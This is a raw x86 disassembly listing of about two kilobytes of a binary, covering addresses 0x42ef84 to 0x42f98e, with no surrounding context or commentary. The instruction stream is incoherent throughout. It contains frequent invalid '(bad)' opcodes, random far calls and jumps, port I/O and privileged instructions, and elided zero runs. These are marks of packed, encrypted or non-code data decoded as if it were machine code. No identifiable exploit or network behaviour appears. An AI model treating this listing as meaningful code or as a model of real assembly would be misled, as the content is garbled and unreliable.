  42ef84:	dec    eax
  42ef85:	(bad)  
  42ef86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ef87:	mov    bl,0x99
  42ef89:	or     dh,BYTE PTR [edi]
  42ef8b:	pop    ds
  42ef8c:	in     eax,0xab
  42ef8e:	hlt    
  42ef8f:	lock push eax
  42ef91:	(bad)  
  42ef92:	lods   eax,DWORD PTR ds:[esi]
  42ef93:	pushf  
  42ef94:	js     0x42ef91
  42ef96:	outs   dx,BYTE PTR ds:[esi]
  42ef97:	mov    ds:0x5e032cdd,eax
  42ef9c:	clc    
  42ef9d:	outs   dx,DWORD PTR ds:[esi]
  42ef9e:	aam    0x8d
  42efa0:	inc    esi
  42efa1:	add    eax,0xe70e33e3
  42efa6:	dec    esi
  42efa7:	addr16 mov eax,0xba3eaca1
  42efad:	(bad)  
  42efae:	in     al,dx
  42efaf:	push   cs
  42efb0:	mov    WORD PTR [esi],es
  42efb2:	dec    ebp
  42efb3:	and    BYTE PTR [edx+0x7faacd1e],bh
  42efb9:	lahf   
  42efba:	std    
  42efbb:	xchg   esp,eax
  42efbc:	sbb    al,0x91
  42efbe:	pop    edx
  42efbf:	fbstp  TBYTE PTR [ecx-0x6e]
  42efc2:	shl    DWORD PTR [ecx+0x7d2d2b86],1
  42efc8:	adc    BYTE PTR [ebx],cl
  42efca:	bound  esi,QWORD PTR [eax]
  42efcc:	retf   
  42efcd:	jnp    0x42efba
  42efcf:	and    ecx,edx
  42efd1:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  42efd3:	or     al,0xa6
  42efd5:	pushf  
  42efd6:	(bad)  [esi]
  42efd8:	es xor al,0x2d
  42efdb:	adc    ah,BYTE PTR [ecx+0x1c]
  42efde:	test   esi,edx
  42efe0:	pop    ecx
  42efe1:	inc    edx
  42efe2:	xor    BYTE PTR [ebp+0xb72625c],dl
  42efe8:	jecxz  0x42f018
  42efea:	ret    
  42efeb:	push   cs
  42efec:	sbb    al,0x69
  42efee:	cwde   
  42efef:	sub    al,0xed
  42eff1:	and    BYTE PTR [eiz*1-0x13567fe9],ah
  42eff8:	cwde   
  42eff9:	mov    ebx,cs
  42effb:	pop    ebp
  42effc:	push   edx
  42effd:	rcl    dh,0xb9
  42f000:	pop    esp
  42f001:	add    eax,0xd758b1c1
  42f006:	mov    eax,ds:0xdb227d02
  42f00b:	fisubr WORD PTR [eax]
  42f00d:	mov    ds:0x228a,eax
	...
  42f072:	add    BYTE PTR [eax],al
  42f074:	adc    bh,BYTE PTR [esi]
  42f076:	int    0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	repnz dec esi
  42f082:	imul   esp,esp,0x60
  42f085:	test   DWORD PTR [ecx],0x10400
  42f08b:	add    BYTE PTR [edi*8+0x7f53f0ea],dl
  42f092:	scas   eax,DWORD PTR es:[edi]
  42f093:	jae    0x42f035
  42f095:	and    esp,DWORD PTR ds:0x3d63ef63
  42f09b:	rcr    BYTE PTR [ebp-0x59d0bd7c],1
  42f0a1:	ror    BYTE PTR [edx],1
  42f0a3:	push   eax
  42f0a4:	loop   0x42f0c2
  42f0a6:	or     eax,0x99282184
  42f0ab:	retf   
  42f0ac:	mov    bh,0xcc
  42f0ae:	lds    ebp,FWORD PTR [edi-0x30e51e0e]
  42f0b4:	adc    DWORD PTR [edi+eax*2],ebx
  42f0b7:	push   0x75
  42f0b9:	jmp    0x42f078
  42f0bb:	adc    eax,0x4e6c9fe8
  42f0c0:	call   0x565d:0x91a28a70
  42f0c7:	in     eax,0x80
  42f0c9:	mov    dh,0x2e
  42f0cb:	shl    dh,cl
  42f0cd:	test   DWORD PTR [edi+eax*8],eax
  42f0d0:	pop    ebp
  42f0d1:	pop    esi
  42f0d2:	xor    ecx,ebx
  42f0d4:	dec    esi
  42f0d5:	addr16 repz fadd st(1),st
  42f0d9:	or     al,0x39
  42f0db:	mov    eax,ds:0xd8391c2a
  42f0e0:	sbb    eax,0xd28927f
  42f0e5:	jo     0x42f07d
  42f0e7:	mov    edi,0x99d8ce1a
  42f0ec:	ficomp DWORD PTR [ecx+0x23]
  42f0ef:	dec    esp
  42f0f0:	lahf   
  42f0f1:	fisttp QWORD PTR [edi+0x78]
  42f0f4:	mov    ds:0x674c4061,eax
  42f0f9:	push   ebx
  42f0fa:	pop    esp
  42f0fb:	push   edx
  42f0fc:	imul   esi,DWORD PTR cs:[eax-0xce5583],0x539c986b
  42f107:	mov    edi,edi
  42f109:	jnp    0x42f11b
  42f10b:	inc    esp
  42f10c:	(bad)  
  42f10d:	fisttp DWORD PTR ds:0x1d433fc0
  42f113:	xor    eax,0xb7b9d9bc
  42f118:	xchg   esp,eax
  42f119:	lods   eax,DWORD PTR ds:[esi]
  42f11a:	push   esp
  42f11b:	fwait
  42f11c:	sbb    DWORD PTR [ebx-0x41],0xf4655d4
  42f123:	xchg   esp,ebx
  42f125:	seta   al
  42f128:	ja     0x42f0d3
  42f12a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f12b:	add    ch,BYTE PTR [edx-0xe]
  42f12e:	add    DWORD PTR [edx+0x48930f53],edx
  42f134:	inc    esp
  42f135:	arpl   WORD PTR [ecx],bp
  42f137:	and    BYTE PTR [ebx],bh
  42f139:	add    eax,0xae579b47
  42f13e:	mov    ds:0xb4038125,al
  42f143:	sub    edi,DWORD PTR [esi-0x18]
  42f146:	int    0x62
  42f148:	pushf  
  42f149:	lods   al,BYTE PTR ds:[esi]
  42f14a:	or     DWORD PTR [esp+edx*1],0xa91b024a
  42f151:	ds xor edx,esp
  42f154:	cdq    
  42f155:	push   es
  42f156:	jno    0x42f1d6
  42f158:	test   BYTE PTR [esp+ecx*8+0x17],cl
  42f15c:	adc    BYTE PTR [eax+ebx*8+0x7f],0x8b
  42f161:	xor    DWORD PTR [esi],edi
  42f163:	cli    
  42f164:	aas    
  42f165:	push   ebx
  42f166:	cmp    al,0x8e
  42f168:	pop    ecx
  42f169:	dec    eax
  42f16a:	mov    al,0xc0
  42f16c:	cs int3 
  42f16e:	and    edx,0x77
  42f171:	jno    0x42f1bd
  42f173:	dec    esi
  42f174:	push   ebx
  42f175:	sub    BYTE PTR [ebx-0x1b],ch
  42f178:	mov    ebx,DWORD PTR ds:0x97e391ec
  42f17e:	fnstcw WORD PTR [ebx]
  42f180:	pop    edi
  42f181:	add    BYTE PTR [esi+0x59],dh
  42f184:	xchg   DWORD PTR [esi],ebp
  42f186:	fbld   TBYTE PTR [ecx-0x2a09443c]
  42f18c:	mov    ds:0x985ef,eax
	...
  42f1f1:	add    BYTE PTR [eax],al
  42f1f3:	add    BYTE PTR [edx+0x26],bl
  42f1f6:	jecxz  0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	(bad)  
  42f201:	xchg   ebp,eax
  42f202:	shl    DWORD PTR [ebx],cl
  42f204:	fs clc 
  42f206:	add    DWORD PTR [eax],eax
  42f208:	add    al,0x1
  42f20a:	add    BYTE PTR [eax],al
  42f20c:	ret    
  42f20d:	fdivrp st(4),st
  42f20f:	(bad)  
  42f210:	leave  
  42f211:	cmp    eax,0xfa2c6455
  42f216:	cmp    eax,0x16c2ef23
  42f21b:	test   al,0xd3
  42f21d:	or     eax,0xba8147ab
  42f222:	inc    ebx
  42f223:	inc    eax
  42f224:	test   al,0xea
  42f226:	push   ebx
  42f227:	ret    
  42f228:	loope  0x42f261
  42f22a:	fs into 
  42f22c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f22d:	sub    ebx,eax
  42f22f:	fdivp  st(6),st
  42f231:	add    eax,0xa2444029
  42f236:	push   ebx
  42f237:	sahf   
  42f238:	gs pop ebp
  42f23a:	mov    ch,BYTE PTR [ebx+0x5c]
  42f23d:	adc    al,0x10
  42f23f:	repnz mov edx,0xbfda3303
  42f245:	jg     0x42f28d
  42f247:	mov    al,ds:0xb9e77be
  42f24c:	sti    
  42f24d:	ss aad 0xe
  42f250:	push   esi
  42f251:	outs   dx,BYTE PTR ds:[esi]
  42f252:	inc    edx
  42f253:	xchg   DWORD PTR [ebx-0x2a2c1f88],esi
  42f259:	and    al,0x4b
  42f25b:	inc    ecx
  42f25c:	dec    esp
  42f25d:	push   ebx
  42f25e:	push   es
  42f25f:	xor    eax,0xf7fc817a
  42f264:	cli    
  42f265:	sbb    DWORD PTR [ecx+0x6e],ebp
  42f268:	mov    ds:0xef155439,al
  42f26d:	xor    BYTE PTR [ecx],dh
  42f26f:	xor    ecx,DWORD PTR [ebp-0x40]
  42f272:	ins    BYTE PTR es:[edi],dx
  42f273:	sbb    al,0x42
  42f275:	or     eax,0xa9563937
  42f27a:	xchg   ecx,eax
  42f27b:	push   esp
  42f27c:	or     eax,0x8947579e
  42f281:	and    ah,bl
  42f283:	mov    cl,0x5d
  42f285:	lods   al,BYTE PTR ds:[esi]
  42f286:	mov    ah,0xe1
  42f288:	mov    edi,0x6c1b866b
  42f28d:	push   es
  42f28e:	sbb    DWORD PTR [edx-0x62ef5f70],0xffffffed
  42f295:	mov    edx,0xa77a8a58
  42f29a:	jmp    0x42f248
  42f29c:	lea    ecx,[ebx+0x4e3a85cd]
  42f2a2:	aas    
  42f2a3:	leave  
  42f2a4:	fistp  WORD PTR [esi+0x714c3d19]
  42f2aa:	inc    ebp
  42f2ab:	scas   eax,DWORD PTR es:[edi]
  42f2ac:	iret   
  42f2ad:	xchg   edx,eax
  42f2ae:	cmp    al,0xd7
  42f2b0:	(bad)  
  42f2b1:	jge    0x42f2c6
  42f2b3:	mov    edx,0x11185d8b
  42f2b8:	pop    eax
  42f2b9:	jmp    0x42f29c
  42f2bb:	sub    dl,BYTE PTR [ecx+0x19]
  42f2be:	test   BYTE PTR [ebp+0x6923b638],ah
  42f2c4:	jbe    0x42f267
  42f2c6:	retf   0xa3ce
  42f2c9:	outs   dx,BYTE PTR ds:[esi]
  42f2ca:	mov    ebp,0x9c4d3271
  42f2cf:	xor    esi,DWORD PTR [esi+0x77]
  42f2d2:	outs   dx,BYTE PTR ds:[esi]
  42f2d3:	scas   al,BYTE PTR es:[edi]
  42f2d4:	fprem1 
  42f2d6:	jg     0x42f258
  42f2d8:	scas   al,BYTE PTR es:[edi]
  42f2d9:	mov    edx,0x1a4b2edd
  42f2de:	or     al,0x2
  42f2e0:	les    ebp,FWORD PTR [esi]
  42f2e2:	in     al,dx
  42f2e3:	(bad)  [ebx]
  42f2e5:	mov    ch,0x6
  42f2e7:	ins    DWORD PTR es:[edi],dx
  42f2e8:	mov    esp,ebx
  42f2ea:	lds    esp,FWORD PTR [esp+edx*2]
  42f2ed:	jge    0x42f2b7
  42f2ef:	js     0x42f29c
  42f2f1:	or     ebx,edi
  42f2f3:	out    0xe3,al
  42f2f5:	jge    0x42f286
  42f2f7:	ss js  0x42f355
  42f2fa:	inc    edx
  42f2fb:	jns    0x42f31c
  42f2fd:	outs   dx,DWORD PTR ds:[esi]
  42f2fe:	clc    
  42f2ff:	xchg   BYTE PTR [esi],cl
  42f301:	pop    ecx
  42f302:	add    BYTE PTR [ecx],bh
  42f304:	cmp    esp,DWORD PTR [eax+0x33f4d066]
  42f30a:	loopne 0x42f2b4
  42f30c:	scas   al,BYTE PTR es:[edi]
  42f30d:	push   ebx
  42f30e:	adc    edi,edi
	...
  42f374:	mov    ebp,0xaf8a081a
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	xor    al,0xc4
  42f382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f383:	inc    esi
  42f384:	push   0x40001f9
  42f389:	add    DWORD PTR [eax],eax
  42f38b:	add    al,cl
  42f38d:	int3   
  42f38e:	cmp    al,0x8e
  42f390:	mov    edx,0xd3c20b6f
  42f395:	push   edi
  42f396:	ins    DWORD PTR es:[edi],dx
  42f397:	daa    
  42f398:	into   
  42f399:	sbb    ebx,edx
  42f39b:	jmp    0x776e:0x89d86434
  42f3a2:	mov    dl,0x7a
  42f3a4:	out    0x38,al
  42f3a6:	pop    esi
  42f3a7:	(bad)  
  42f3a8:	jno    0x42f399
  42f3aa:	int3   
  42f3ab:	push   cs
  42f3ac:	jbe    0x42f3b3
  42f3ae:	lock aad 0x3
  42f3b1:	mov    ah,0x36
  42f3b3:	jbe    0x42f433
  42f3b5:	xchg   esi,eax
  42f3b6:	add    ecx,ebp
  42f3b8:	(bad)  
  42f3b9:	sub    ecx,DWORD PTR [edx*8-0x76b123b7]
  42f3c0:	shr    ah,cl
  42f3c2:	in     eax,0xbe
  42f3c4:	les    ebp,FWORD PTR [edx+0x75]
  42f3c7:	push   0x10a4563
  42f3cc:	pushf  
  42f3cd:	std    
  42f3ce:	xor    DWORD PTR [ecx+0x24],ebx
  42f3d1:	mov    bh,dl
  42f3d3:	ret    0x4d8c
  42f3d6:	data16 cli 
  42f3d8:	out    0x15,eax
  42f3da:	jb     0x42f41d
  42f3dc:	aam    0xd6
  42f3de:	ret    0xcc6
  42f3e1:	xchg   ecx,eax
  42f3e2:	adc    bh,BYTE PTR [esp+edi*8+0x67d45f43]
  42f3e9:	fisttp QWORD PTR [ebx+0x474d58d0]
  42f3ef:	bound  eax,QWORD PTR [edx]
  42f3f1:	xor    BYTE PTR [ebp+0x3b3be209],ch
  42f3f7:	and    ch,BYTE PTR [esi-0x74e2f197]
  42f3fd:	push   edx
  42f3fe:	mov    eax,0x3e02199
  42f403:	or     eax,0x75dfbb9c
  42f408:	xlat   BYTE PTR ds:[ebx]
  42f409:	jg     0x42f3b7
  42f40b:	adc    edi,esp
  42f40d:	ror    BYTE PTR [ebx],cl
  42f40f:	out    0x76,eax
  42f411:	outs   dx,DWORD PTR ds:[esi]
  42f412:	fbstp  TBYTE PTR [edx]
  42f414:	fneni(8087 only) 
  42f416:	jle    0x42f425
  42f418:	or     DWORD PTR [esi],ebx
  42f41a:	mov    ebx,0x86f7442b
  42f41f:	jl     0x42f40e
  42f421:	adc    eax,0x83dd2d33
  42f426:	bound  ebp,QWORD PTR [ebx-0x66]
  42f429:	adc    ch,dh
  42f42b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f42c:	lods   al,BYTE PTR ds:[esi]
  42f42d:	mov    dl,0xa5
  42f42f:	mov    DWORD PTR [esi-0x72],ecx
  42f432:	ins    DWORD PTR es:[edi],dx
  42f433:	dec    esp
  42f434:	xor    eax,0xf48154e8
  42f439:	sbb    eax,0x12855269
  42f43e:	daa    
  42f43f:	pop    ss
  42f440:	scas   eax,DWORD PTR es:[edi]
  42f441:	lock mov ebx,0x2b4d2904
  42f447:	fidiv  WORD PTR [ecx+0x51]
  42f44a:	cmp    al,0xe0
  42f44c:	push   DWORD PTR [eax+esi*2+0x78629a8b]
  42f453:	mov    bl,0x25
  42f455:	test   BYTE PTR [edi],ch
  42f457:	shr    edx,cl
  42f459:	call   0x7faf:0xfc7fda95
  42f460:	cld    
  42f461:	adc    al,0xd0
  42f463:	jp     0x42f475
  42f465:	mov    al,0x6b
  42f467:	mov    esp,0x5cca847a
  42f46c:	das    
  42f46d:	xor    ebx,edx
  42f46f:	push   edi
  42f470:	cmc    
  42f471:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f472:	shr    BYTE PTR [edi-0x56efbf92],0xa3
  42f479:	sub    esi,DWORD PTR [ebx]
  42f47b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f47c:	call   0x8334:0x845bf462
  42f483:	leave  
  42f484:	call   0x2a57:0x5fb9410c
  42f48b:	push   ds
  42f48c:	fisubr DWORD PTR [edx]
  42f48e:	js     0x42f482
	...
  42f4f4:	aaa    
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	and    ch,BYTE PTR [edx-0x5930f79]
  42f506:	add    DWORD PTR [eax],eax
  42f508:	add    al,0x1
  42f50a:	add    BYTE PTR [eax],al
  42f50c:	xor    BYTE PTR [edi+eax*8],bh
  42f50f:	iret   
  42f510:	gs cmc 
  42f512:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f513:	or     DWORD PTR [ecx-0x397672eb],0xffffffcd
  42f51a:	jmp    0x5880:0xca408a10
  42f521:	push   ss
  42f522:	in     eax,0x3f
  42f524:	adc    BYTE PTR [ecx],0x10
  42f527:	and    al,0xf
  42f529:	ret    
  42f52a:	jns    0x42f5a3
  42f52c:	sbb    edx,DWORD PTR [edi-0x3e365598]
  42f532:	aas    
  42f533:	add    BYTE PTR [eax],0x92
  42f536:	push   es
  42f537:	rcr    bh,1
  42f539:	mov    ch,0xa7
  42f53b:	sar    ecx,1
  42f53d:	test   al,0xee
  42f53f:	dec    eax
  42f540:	aam    0x49
  42f542:	das    
  42f543:	inc    ebp
  42f544:	sbb    DWORD PTR [ecx],ebp
  42f546:	adc    BYTE PTR [edx],al
  42f548:	jae    0x42f4f3
  42f54a:	xchg   DWORD PTR [ecx],edx
  42f54c:	jp     0x42f4ce
  42f54e:	mov    al,ds:0xaf1eb8af
  42f553:	fbld   TBYTE PTR [edi+0x52fc5584]
  42f559:	loop   0x42f5ca
  42f55b:	xor    eax,0x1de4da01
  42f560:	inc    ebx
  42f561:	cli    
  42f562:	xor    DWORD PTR [eax+0x34a193f7],esp
  42f568:	out    dx,eax
  42f569:	cmp    BYTE PTR [edx-0x4b],ch
  42f56c:	xchg   BYTE PTR [edi+0x19],al
  42f56f:	daa    
  42f570:	push   0xd3d5cdfe
  42f575:	ret    0x7936
  42f578:	sqrtps xmm6,XMMWORD PTR [ebp-0x5f7d10d4]
  42f57f:	add    BYTE PTR [ecx-0x66cffca1],bh
  42f585:	jmp    0x42f5f3
  42f587:	sub    esi,DWORD PTR [edx]
  42f589:	jmp    0x3fb3:0x62008c32
  42f590:	mov    fs:0x70c7354c,eax
  42f596:	mov    ebx,0x53f44964
  42f59b:	mov    edi,0x6897e755
  42f5a0:	arpl   WORD PTR [ebx],sp
  42f5a2:	xor    eax,0xbd85a140
  42f5a7:	mov    ah,0x88
  42f5a9:	sub    DWORD PTR [edi],eax
  42f5ab:	scas   al,BYTE PTR es:[edi]
  42f5ac:	fsubr  QWORD PTR [ebp+0x7f]
  42f5af:	add    eax,0x2eed8d74
  42f5b4:	test   DWORD PTR [esi+ecx*8-0x682ec131],edx
  42f5bb:	jmp    0xfaef54bc
  42f5c0:	or     DWORD PTR [ebx+0x72c56e88],esp
  42f5c6:	sbb    bh,ah
  42f5c8:	push   cs
  42f5c9:	daa    
  42f5ca:	add    ebp,DWORD PTR [eax-0x17]
  42f5cd:	push   esi
  42f5ce:	inc    ecx
  42f5cf:	xor    al,0x3f
  42f5d1:	fs mov cl,0x8b
  42f5d4:	(bad)  
  42f5d5:	outs   dx,DWORD PTR ds:[esi]
  42f5d6:	dec    ebp
  42f5d7:	ds add eax,0x32a0246c
  42f5dd:	jmp    0x758f243d
  42f5e2:	mov    ch,ch
  42f5e4:	je     0x42f660
  42f5e6:	retf   0xb1d9
  42f5e9:	xor    al,0xcd
  42f5eb:	push   ecx
  42f5ec:	(bad)  
  42f5ed:	shl    DWORD PTR [eax],1
  42f5ef:	cmp    BYTE PTR [ebx-0x5c],dl
  42f5f2:	pop    ss
  42f5f3:	icebp  
  42f5f4:	mov    al,0x14
  42f5f6:	mov    ds:0x35043e6e,al
  42f5fb:	(bad)  
  42f5fc:	xlat   BYTE PTR ds:[ebx]
  42f5fd:	push   es
  42f5fe:	xor    edx,ebx
  42f600:	(bad)  
  42f601:	push   ds
  42f602:	xchg   esp,eax
  42f603:	push   edx
  42f604:	int3   
  42f605:	add    cl,BYTE PTR [ecx+0x7ad03ff0]
  42f60b:	pop    ecx
  42f60c:	enter  0xc745,0xf3
	...
  42f674:	ds push esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	push   esp
  42f681:	xor    BYTE PTR [edx-0x54],cl
  42f684:	jo     0x42f681
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    al,0x1
  42f68a:	add    BYTE PTR [eax],al
  42f68c:	pop    esi
  42f68d:	or     eax,0xf330e8f0
  42f692:	push   ebp
  42f693:	shr    BYTE PTR [edx],cl
  42f695:	fmul   DWORD PTR [edi+0x14]
  42f698:	jo     0x42f627
  42f69a:	add    DWORD PTR [ebx],ebp
  42f69c:	push   0x7a
  42f69e:	shr    DWORD PTR [ebp*8+0x34a0cf1a],cl
  42f6a5:	jmp    0x1b18996a
  42f6aa:	loope  0x42f6f8
  42f6ac:	lea    eax,[eax+0x77]
  42f6af:	mov    ebx,0x47da9099
  42f6b4:	popa   
  42f6b5:	adc    ebx,edi
  42f6b7:	mov    dl,0x69
  42f6b9:	mov    ds:0xeb8f5e1a,eax
  42f6be:	arpl   WORD PTR [esi-0x5d],cx
  42f6c1:	mov    ds:0x814819ab,eax
  42f6c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f6c7:	jecxz  0x42f6d0
  42f6c9:	xor    ebx,esi
  42f6cb:	sub    edx,ecx
  42f6cd:	xor    bl,BYTE PTR [edx]
  42f6cf:	inc    edi
  42f6d0:	mov    gs,esp
  42f6d2:	mov    al,0xb7
  42f6d4:	xor    eax,0xa790e2b
  42f6d9:	ficom  DWORD PTR [ebx+0x4a]
  42f6dc:	sbb    ah,BYTE PTR [edx]
  42f6de:	stos   DWORD PTR es:[edi],eax
  42f6df:	sbb    bh,dh
  42f6e1:	ror    DWORD PTR [ecx-0x5b],1
  42f6e4:	jno    0x42f6fc
  42f6e6:	fdivr  st(6),st
  42f6e8:	mov    ah,0xcc
  42f6ea:	add    ebp,DWORD PTR [ebx-0x69]
  42f6ed:	dec    edx
  42f6ee:	and    BYTE PTR [eax+0x13],0xa5
  42f6f2:	outs   dx,DWORD PTR ds:[esi]
  42f6f3:	icebp  
  42f6f4:	pop    eax
  42f6f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f6f6:	mov    esp,0x1b4f40cd
  42f6fb:	pusha  
  42f6fc:	dec    edi
  42f6fd:	adc    bl,BYTE PTR [edi]
  42f6ff:	sub    al,0x24
  42f701:	mov    eax,ds:0x15e21f0b
  42f706:	fwait
  42f707:	test   al,0x74
  42f709:	std    
  42f70a:	jno    0x42f68f
  42f70c:	sub    al,0x50
  42f70e:	mov    eax,0xcafb4cbf
  42f713:	ror    esi,0xc6
  42f716:	int3   
  42f717:	jmp    0xc65e:0x319fd600
  42f71e:	mov    ecx,0x6834ba19
  42f723:	repz add eax,0x18a25cbb
  42f729:	js     0x42f6c4
  42f72b:	dec    esi
  42f72c:	in     al,0x27
  42f72e:	inc    esi
  42f72f:	sbb    eax,0xf83328c6
  42f734:	sbb    BYTE PTR [ebx-0x472ae312],ch
  42f73a:	std    
  42f73b:	test   DWORD PTR [edi+0x29],eax
  42f73e:	nop
  42f73f:	stos   DWORD PTR es:[edi],eax
  42f740:	fbstp  TBYTE PTR [ebx-0xb]
  42f743:	gs push ebx
  42f745:	pop    es
  42f746:	enter  0x29cf,0xd3
  42f74a:	pop    ds
  42f74b:	lods   al,BYTE PTR ds:[esi]
  42f74c:	aas    
  42f74d:	(bad)  
  42f74e:	fcom   DWORD PTR [ebx]
  42f750:	shl    BYTE PTR [eax+0x72d9d0f7],cl
  42f756:	fst    QWORD PTR [esi-0x49d72627]
  42f75c:	sar    DWORD PTR [ecx+0x248780f9],0x6c
  42f763:	xor    edx,esi
  42f765:	inc    esi
  42f766:	sub    bl,ah
  42f768:	cmc    
  42f769:	or     BYTE PTR [ebx-0x29],bl
  42f76c:	ret    0xad99
  42f76f:	stos   BYTE PTR es:[edi],al
  42f770:	push   ecx
  42f771:	retf   
  42f772:	daa    
  42f773:	mov    eax,0xfa2eb0fd
  42f778:	adc    edi,DWORD PTR [eax+edx*2]
  42f77b:	sub    DWORD PTR [edi],0xffffffb2
  42f77e:	aad    0x64
  42f780:	sbb    ebp,edi
  42f782:	dec    esp
  42f783:	xlat   BYTE PTR ds:[ebx]
  42f784:	dec    edi
  42f785:	cmc    
  42f786:	sbb    DWORD PTR [ecx-0x27bc7c32],edi
  42f78c:	mov    edx,0x32d88e
	...
  42f7f1:	add    BYTE PTR [eax],al
  42f7f3:	add    BYTE PTR [ecx-0x5f],dh
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0xf8a3fc7c
  42f804:	je     0x42f802
  42f806:	add    DWORD PTR [eax],eax
  42f808:	add    al,0x1
  42f80a:	add    BYTE PTR [eax],al
  42f80c:	je     0x42f884
  42f80e:	push   esi
  42f80f:	fdiv   DWORD PTR [esi+0x619d236d]
  42f815:	daa    
  42f816:	mov    dl,0xe5
  42f818:	xchg   esi,eax
  42f819:	adc    ah,bl
  42f81b:	sub    al,0xc8
  42f81d:	add    al,0x2a
  42f81f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f820:	adc    BYTE PTR [eax+edi*2-0x56],al
  42f824:	(bad)  
  42f826:	js     0x42f883
  42f828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f829:	les    edx,FWORD PTR [eax+0x580b3c6e]
  42f82f:	mov    WORD PTR [edi],ds
  42f831:	pushf  
  42f832:	and    bh,BYTE PTR [ecx+0x5]
  42f835:	jae    0x42f7e8
  42f837:	xchg   ecx,eax
  42f838:	(bad)  
  42f839:	cmp    BYTE PTR [esi-0x296439a4],bl
  42f83f:	mov    ds:0xe7e5b49d,al
  42f844:	mov    ch,0x44
  42f846:	mov    WORD PTR [ebx-0x38],?
  42f849:	dec    edx
  42f84a:	and    cl,BYTE PTR [ecx-0x6cc0a51]
  42f850:	inc    ebp
  42f851:	loopne 0x42f81d
  42f853:	lock mov eax,ds:0x16840c1d
  42f859:	lea    esi,[edx-0x44a34416]
  42f85f:	imul   ecx,DWORD PTR [eax],0x68
  42f862:	imul   esp,DWORD PTR [edx],0xfffffff5
  42f865:	cli    
  42f866:	call   FWORD PTR [ebx+0x3e00a8f]
  42f86c:	add    eax,0x30983bf2
  42f871:	dec    eax
  42f872:	aas    
  42f873:	rcl    DWORD PTR [edi-0x7e384cdf],1
  42f879:	or     esp,DWORD PTR [eax+0x71]
  42f87c:	xor    al,0x0
  42f87e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f87f:	or     BYTE PTR [ebp-0x6b],dh
  42f882:	and    DWORD PTR [ebx-0xd],0xa93484f9
  42f889:	loop   0x42f8a7
  42f88b:	push   ebp
  42f88c:	cwde   
  42f88d:	push   ds
  42f88e:	cwde   
  42f88f:	jle    0x42f8dd
  42f891:	and    edx,DWORD PTR ds:0xbd643177
  42f897:	cmp    eax,0x2fc60d61
  42f89c:	iret   
  42f89d:	mov    WORD PTR [ecx],ss
  42f89f:	sbb    eax,0x2db1c856
  42f8a4:	xchg   DWORD PTR [esi-0x5c78762e],ecx
  42f8aa:	xor    ecx,DWORD PTR [edx-0xb]
  42f8ad:	imul   edi,DWORD PTR [ecx+esi*4+0x75],0xffffffd6
  42f8b2:	pop    ss
  42f8b3:	dec    eax
  42f8b4:	arpl   WORD PTR [eax-0x2f],bx
  42f8b7:	sub    ah,BYTE PTR [esi-0x1d]
  42f8ba:	call   0x8e0ae339
  42f8bf:	add    al,0xfe
  42f8c1:	mov    edi,0x4cae478b
  42f8c6:	jmp    0x42f8b0
  42f8c8:	adc    ebp,DWORD PTR [ebp-0x5807baf3]
  42f8ce:	iret   
  42f8cf:	fdiv   QWORD PTR [esi]
  42f8d1:	cwde   
  42f8d2:	outs   dx,BYTE PTR ds:[esi]
  42f8d3:	cwde   
  42f8d4:	ins    DWORD PTR es:[edi],dx
  42f8d5:	mov    ecx,ebx
  42f8d7:	or     DWORD PTR [edx+0x14],0xec6bf7bf
  42f8de:	dec    ebx
  42f8df:	adc    eax,0x7bdcfb77
  42f8e4:	das    
  42f8e5:	mov    ebp,0x4ac844d9
  42f8ea:	mov    ah,0xe7
  42f8ec:	xor    esi,ecx
  42f8ee:	ret    0x7ce6
  42f8f1:	scas   eax,DWORD PTR es:[edi]
  42f8f2:	push   ds
  42f8f3:	pop    ecx
  42f8f4:	jbe    0x42f8eb
  42f8f6:	das    
  42f8f7:	or     al,0xd2
  42f8f9:	fcmovnbe st,st(4)
  42f8fb:	icebp  
  42f8fc:	fucom  st(5)
  42f8fe:	push   esp
  42f8ff:	inc    eax
  42f900:	int3   
  42f901:	or     edx,esi
  42f903:	loopne 0x42f973
  42f905:	sub    edx,DWORD PTR [edx]
  42f907:	or     DWORD PTR [edi-0x443cbff9],ebx
  42f90d:	and    BYTE PTR [ebx],0x7d
	...
  42f974:	adc    al,0x74
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f9f3
  42f981:	sbb    BYTE PTR [edi-0x34],al
  42f984:	js     0x42f983
  42f986:	add    DWORD PTR [eax],eax
  42f988:	add    al,0x1
  42f98a:	add    BYTE PTR [eax],al
  42f98c:	mov    ecx,ebp
  42f98e:	sbb    DWORD PTR [edx+0x78959a97],eax
